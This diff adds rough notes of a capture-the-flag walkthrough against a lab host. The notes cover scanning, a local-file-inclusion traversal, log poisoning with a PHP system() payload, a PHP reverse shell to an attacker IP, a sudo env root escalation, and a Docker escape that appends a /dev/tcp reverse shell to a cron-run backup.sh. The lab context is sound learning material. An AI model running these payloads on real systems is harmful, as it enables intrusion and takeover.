@@ -1,0 +1,129 @@
+# nmap scan : 
+
+map -sC -sV -A 10.10.111.125
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-01 06:34 EDT
+Nmap scan report for 10.10.111.125
+Host is up (0.19s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
+|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
+|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+gobuster scan :
+
+/cats                 (Status: 301) [Size: 313] [--> http://10.10.111.125/cats/]
+/index.php            (Status: 200) [Size: 418]                                 
+/server-status        (Status: 403) [Size: 278]
+
+
+--------------------------------------------------------------------
+
+
+lfi : local file inclusion traversal
+
+http://10.10.177.117/?view=dogs/../../../../../../../../etc/passwd&ext=
+
+
+--------------------------------------------------------------------
+uploading bash rev shell :
+
+repeater:
+
+burp suit to check LFI : modifying UserAgent : <?php system($_GET['cmd'];) ?>
+
+ET /?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=php+-r+'$sock%3dfsockopen("10.2.95.161",80)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
+Host: 10.10.0.5
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: <?php system($_GET['cmd']);?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+
+
+nc -lnvp 80 listing and get a bash window 
+
+got 2 flags from /var/www/html
+got 1 flag from /var/www/
+
+EXPORT TERM=xterm
+
+--------------------------------------------------------------------
+priv esc :
+sudo env /bin/sh
+
+got root  acccess. 
+
+
+
+--------------------------------------------------------------------
+
+ cmd    :      cat /proc/1/cgroup
+
+
+12:cpuset:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+11:rdma:/
+10:perf_event:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+9:blkio:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+8:memory:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+7:pids:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+6:devices:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+5:net_cls,net_prio:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+4:hugetlb:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+3:cpu,cpuacct:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+2:freezer:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+1:name=systemd:/docker/8240f2f552c17eb4914490fdfac05ea167301d7dfc5361af58840eb7d7beb212
+0::/system.slice/containerd.service
+
+
+got to know that its running on container
+
+
+
+
+
+--------------------------------------------------------------------
+
+
+cd /opt/backup
+
+backup.sh
+backup.tar
+
+
+go to know that it executing cmd which is there in backup.sh continiously
+
+--------------------------------------------------------------------
+
+soo echo "#1bin/bash" > backup.sh
+
+to check if its executing ...it is :)
+
+
+echo "bash -i >& /dev/tcp/10.2.95.161/52 0>&1" >> backup.sh 
+
+
+have listner open : nc -lnvp 52
+
+got a bash window :
+
+cat the last flag
+
+
+
+
+
+
+
+
+
+
+
+
